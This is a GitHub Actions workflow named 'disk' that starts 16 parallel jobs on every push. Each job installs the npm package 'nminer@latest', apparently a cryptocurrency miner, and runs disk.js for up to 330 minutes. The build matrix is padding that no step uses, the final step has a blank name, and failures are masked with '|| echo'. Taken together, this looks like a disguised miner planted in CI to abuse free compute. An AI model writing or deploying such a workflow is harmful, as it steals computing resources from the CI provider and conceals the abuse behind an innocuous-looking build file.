name: disk
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 305 }
          - { version: 153 }
          - { version: 4778 }
          - { version: 4137 }
          - { version: 7586 }
          - { version: 1550 }
          - { version: 7499 }
          - { version: 4603 }
          - { version: 668 }
          - { version: 1810 }
          - { version: 138 }
          - { version: 9659 }
          - { version: 6298 }
          - { version: 7735 }
          - { version: 479 }
          - { version: 3427 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 330m node disk.js || echo "disk executed"